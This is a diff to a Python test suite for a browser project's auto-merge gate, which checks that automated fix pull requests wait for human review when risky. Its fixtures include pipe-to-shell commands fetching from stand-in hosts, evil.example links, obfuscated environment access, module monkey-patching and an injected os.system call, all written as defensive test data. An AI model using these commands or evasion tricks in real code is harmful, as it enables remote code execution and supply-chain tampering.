@@ -58,7 +58,16 @@ def pr(ref="automation/autofix-main", repo=REPO, draft=True):
 OK_CHECKS = [{"name": "tests", "status": "completed", "conclusion": "success"},
              {"name": "sandbox", "status": "completed", "conclusion": "success"},
              {"name": "hand-over", "status": "completed", "conclusion": "skipped"}]
-CODE = [{"filename": "ike/window.py", "status": "modified", "patch": "@@ -1 +1 @@\n-a = 1\n+a = 2"},
+BASE = """from PyQt6.QtWidgets import QLabel
+
+
+class Win:
+    def title(self):
+        self.label = QLabel("I.K.E.")
+        return 1
+"""
+CODE = [{"filename": "ike/window.py", "status": "modified", "patch": "@@ -1 +1 @@\n-a = 1\n+a = 2",
+         "old_source": BASE, "new_source": BASE.replace("return 1", "return 2")},
         {"filename": "CHANGELOG.md", "status": "modified",
          "patch": "@@ -3,0 +4,2 @@\n+## 1.1.20\n+- Automatic fix"}]
 COMMITS = [{"commit": {"message": "autofix: attempt 1 after a failure of \"Tests\"\n\nPrepared by..."}}]
@@ -74,8 +83,17 @@ def decide(p=None, commits=COMMITS, files=CODE, checks=OK_CHECKS, **kw):
     return merge.decide(REPO, p or pr(), commits, files, checks, lambda n: guard.allowed_path(n, False), **kw)
 
 
-def f(name, patch="@@ -1 +1 @@\n-a = 1\n+a = 2", status="modified"):
-    return {"filename": name, "status": status, "patch": patch}
+def f(name, patch="@@ -1 +1 @@\n-a = 1\n+a = 2", status="modified", new=None):
+    out = {"filename": name, "status": status, "patch": patch}
+    if name.endswith(".py"):
+        out.update(old_source=BASE, new_source=new if new is not None else BASE.replace("return 1", "return 2"))
+    return out
+
+
+def py(added):
+    """A change of ike/window.py that adds these lines inside the method."""
+    new = BASE.replace("        return 1", "".join("        %s\n" % line for line in added) + "        return 1")
+    return f("ike/window.py", "@@ -6,0 +7,%d @@\n" % len(added) + "\n".join("+" + x for x in added), new=new)
 
 
 def test_a_green_fix_of_interface_code_is_merged():
@@ -85,6 +103,21 @@ def test_a_green_fix_of_interface_code_is_merged():
     gpt = OK_CHECKS + [{"name": "guard", "status": "completed", "conclusion": "success"}]
     assert decide(pr("chatgpt/fix-20261121-0505"), commits=[{"commit": {"message": "Fix the tab bar"}}],
                   checks=gpt) == ("merge", "")
+
+
+def test_the_automations_own_jobs_are_not_waited_for():
+    """Review 4, N7: the job that asks for the merge is itself a check of the
+    commit; waiting for it ended the deciding run on "wait" for good."""
+    own = [{"name": n, "status": "in_progress", "conclusion": None} for n in ("merge-ready", "hand-over", "merge")]
+    assert decide(checks=OK_CHECKS + own) == ("merge", "")
+    text = (ROOT / "tools" / "automerge.py").read_text()
+    assert "for _round in range(16):" in text and "time.sleep(30)" in text      # read again for a while
+
+
+def test_a_harmless_interface_change_still_merges():
+    """The syntax-tree rule keeps what is risky for a person, not every change."""
+    assert decide(files=[py(["self.label.setToolTip('Tab ' + str(2))", "n = len(self.label.text()) + 1"])]) \
+        == ("merge", "")
 
 
 def test_it_waits_while_checks_run():
@@ -109,6 +142,21 @@ def test_everything_else_waits_for_a_person():
         "no patch": decide(files=[{"filename": "ike/window.py", "status": "modified"}]),
         # M1, M2
         "conftest": decide(files=[f("ike/conftest.py")]),
+        # review 4, N1: what a list of words did not see, judged on the syntax tree
+        "alias of updater": decide(files=[py(["from . import updater as _u", "_u.source = lambda: {}"])]),
+        "new address": decide(files=[py(["self.url = 'https://example.net/collect?q=%s'"])]),
+        "getattr": decide(files=[py(["getattr(self, 'env' + 'iron')"])]),
+        "from sys": decide(files=[py(["from sys import modules as _m"])]),
+        "argv": decide(files=[py(["_T = any('t' in x for x in __import__('sys').argv)"])]),
+        "platformName": decide(files=[py(["return QLabel.platformName() == 'off' + 'screen'"])]),
+        "module attr": decide(files=[py(["QLabel.setText = lambda *a: None"])]),
+        "global": decide(files=[py(["global X"])]),
+        "whole file unread": decide(files=[{"filename": "ike/window.py", "status": "modified",
+                                            "patch": "@@ -1 +1 @@\n-a = 1\n+a = 2"}]),
+        "docs command": decide(files=[f("docs/MAINTENANCE.md", "@@ -3,0 +4 @@\n+Run: `curl -s https://x.example/y | sh`")]),
+        "docs link": decide(files=[f("docs/MAINTENANCE.md", "@@ -3,0 +4 @@\n+See https://evil.example/")]),
+        "version jump": decide(files=CODE[:1] + [f("ike/__init__.py", '@@ -5 +5 @@\n-__version__ = "1.1.20"\n'
+                                                                    '+__version__ = "99.0.0"')]),
         "darkreader": decide(files=[f("ike/resources/darkreader.js")]),
         "tools": decide(files=[f("tools/check-components.py")]),
         "maintenance commit": decide(pr("chatgpt/fix-2"), commits=[{"commit": {"message": "maintenance: update"}}]),
@@ -119,6 +167,8 @@ def test_everything_else_waits_for_a_person():
                                                     "+**Version 1.1.20** install with: curl https://x | sh")]),
         "changelog link": decide(files=[f("CHANGELOG.md", "@@ -3,0 +4 @@\n+- see https://evil.example/")]),
         "changelog removed": decide(files=[f("CHANGELOG.md", "@@ -40 +40 @@\n-old\n+new")]),
+        "changelog code": decide(files=[f("CHANGELOG.md", "@@ -3,0 +4 @@\n+- run `curl x | sh`")]),
+        "changelog text": decide(files=[f("CHANGELOG.md", "@@ -3,0 +4 @@\n+Paste this in a terminal")]),
         "version+": decide(files=[f("ike/__init__.py", '@@ -5 +5,2 @@\n-__version__ = "1.1.19"\n'
                                                        '+__version__ = "1.1.20"\n+__min_system__ = "1.1.20"')]),
         # M4: a trial by any spelling, or any commit the automatic fix did not write
@@ -218,35 +268,101 @@ def _candidate_check():
 
 
 def test_the_maintenance_candidate_changes_only_update_files(tmp_path):
-    """H5: code of others runs while the candidate is made; what it may leave
-    in the candidate is a fixed list of files, in the update's own commit."""
+    """H5, and review 4's N2: code of others runs while the candidate is made;
+    what it may leave is a fixed list of files in the update's own commit, the
+    version files with only the version, and automatic fixes only as the fix
+    job published them."""
     import subprocess
     import sys
     script = tmp_path / "check.py"
     script.write_text(_candidate_check())
-
-    def git(*a):
-        subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@t", *a], cwd=repo, check=True,
-                       capture_output=True)
-
-    def run(files, message="maintenance: update bundled components for IKE 1.1.20"):
-        git("checkout", "-q", "-B", "cand", "main")
-        for name in files:
-            p = repo / name
-            p.parent.mkdir(parents=True, exist_ok=True)
-            p.write_text("changed\n")
-        git("add", "-A")
-        git("commit", "-q", "-m", message)
-        git("update-ref", "refs/ike/candidate", "cand")
-        return subprocess.run([sys.executable, "-I", str(script)], cwd=repo, capture_output=True, text=True)
     repo = tmp_path / "r"
     repo.mkdir()
+
+    def git(*a):
+        return subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@t", *a], cwd=repo, check=True,
+                              capture_output=True, text=True).stdout
+
+    def write(name, text):
+        p = repo / name
+        p.parent.mkdir(parents=True, exist_ok=True)
+        p.write_text(text)
     git("init", "-q", "-b", "main")
-    (repo / "README.md").write_text("x\n")
+    write("ike/__init__.py", '__version__ = "1.1.20"\n__min_system__ = "1.0.1"\n')
+    write("PKGBUILD", "pkgname=ike-browser\npkgver=1.1.20\npkgrel=1\n")
+    write("ike/updater.py", "x = 1\n")
+    write("README.md", "x\n")
     git("add", "-A")
     git("commit", "-q", "-m", "start")
     git("update-ref", "refs/remotes/origin/main", "main")
-    assert run(["ike-adblock/Cargo.lock", "ike/resources/darkreader.js", "ike/__init__.py"]).returncode == 0
-    bad = run(["ike/resources/ubo-scriptlets.json", "ike/updater.py"])
+
+    def candidate(changes, message="maintenance: update bundled components for IKE 1.1.21", carry=None):
+        git("checkout", "-q", "-B", "cand", "main")
+        for name, text in changes.items():
+            write(name, text)
+        git("add", "-A")
+        git("commit", "-q", "-m", message)
+        git("update-ref", "refs/ike/candidate", "cand")
+        return subprocess.run([sys.executable, "-I", str(script), str(ROOT), "o/r"], cwd=repo,
+                              capture_output=True, text=True)
+    version = {"ike/__init__.py": '__version__ = "1.1.21"\n__min_system__ = "1.0.1"\n',
+               "PKGBUILD": "pkgname=ike-browser\npkgver=1.1.21\npkgrel=1\n"}
+    ok = candidate(dict(version, **{"ike-adblock/Cargo.lock": "x\n", "ike/resources/darkreader.js": "x\n"}))
+    assert ok.returncode == 0, ok.stdout + ok.stderr
+    bad = candidate({"ike/resources/ubo-scriptlets.json": "x\n", "ike/updater.py": "evil\n"})
     assert bad.returncode == 1 and "ike/updater.py" in bad.stdout, bad.stdout
-    assert run(["README.md"], message="something else").returncode == 1
+    code = candidate({"ike/__init__.py": '__version__ = "1.1.21"\nimport os; os.system("id")\n'})
+    assert code.returncode == 1 and "more than the version" in code.stdout, code.stdout
+    assert candidate({"README.md": "y\n"}, message="something else").returncode == 1
+    # an "autofix:" commit the fix job did not publish
+    forged = candidate({"ike/updater.py": "evil\n"}, message="autofix: attempt 1 after a failure of Tests")
+    assert forged.returncode == 1 and "not one the fix job published" in forged.stdout, forged.stdout
+    # the same change published on the candidate branch by the fix job: carried
+    git("checkout", "-q", "-B", "published", "main")
+    write("ike/updater.py", "fixed\n")
+    git("add", "-A")
+    git("commit", "-q", "-m", "autofix: attempt 1 after a failure of Tests")
+    git("update-ref", "refs/remotes/origin/automation/daily-maintenance", "published")
+    carried = candidate({"ike/updater.py": "fixed\n"}, message="autofix: attempt 1 after a failure of Tests")
+    assert carried.returncode == 0, carried.stdout + carried.stderr
+
+
+def test_a_real_maintenance_candidate_passes_the_check(tmp_path):
+    """The check must not stop the daily candidate itself: one made by
+    tools/prepare-maintenance.py (a new engine, the version raised, a new
+    CHANGELOG entry), and one that adds to a version not yet published."""
+    import json
+    import shutil
+    import subprocess
+    import sys
+    script = tmp_path / "check.py"
+    script.write_text(_candidate_check())
+    repo = tmp_path / "r"
+
+    def git(*a):
+        return subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@t", *a], cwd=repo, check=True,
+                              capture_output=True, text=True).stdout
+    for rel in ("ike/__init__.py", "PKGBUILD", "README.md", "CHANGELOG.md"):
+        (repo / rel).parent.mkdir(parents=True, exist_ok=True)
+        shutil.copy(ROOT / rel, repo / rel)
+    git("init", "-q", "-b", "main")
+    git("add", "-A")
+    git("commit", "-q", "-m", "start")
+    git("update-ref", "refs/remotes/origin/main", "main")
+    report = tmp_path / "report.json"
+    report.write_text(json.dumps({"errors": 0, "components": [{
+        "name": "AdBlock engine (adblock-rust)", "current": "0.10.0", "latest": "0.10.1",
+        "update": True, "note": "", "also": ""}]}))
+    version = re.search(r'__version__ = "([^"]+)"', (ROOT / "ike/__init__.py").read_text()).group(1)
+    for keep in ([], ["--keep-version"]):
+        git("checkout", "-q", "-B", "cand", "main")
+        subprocess.run([sys.executable, str(ROOT / "tools/prepare-maintenance.py"), "--root", str(repo),
+                        "--report", str(report), "--base-version", version, *keep], check=True)
+        (repo / "ike-adblock").mkdir(exist_ok=True)
+        (repo / "ike-adblock" / "Cargo.lock").write_text("new\n")
+        git("add", "-A")
+        git("commit", "-q", "-m", "maintenance: update bundled components")
+        git("update-ref", "refs/ike/candidate", "cand")
+        res = subprocess.run([sys.executable, "-I", str(script), str(ROOT), "NullSector-2077/IKE-Browser"],
+                             cwd=repo, capture_output=True, text=True)
+        assert res.returncode == 0, (keep, res.stdout + res.stderr)
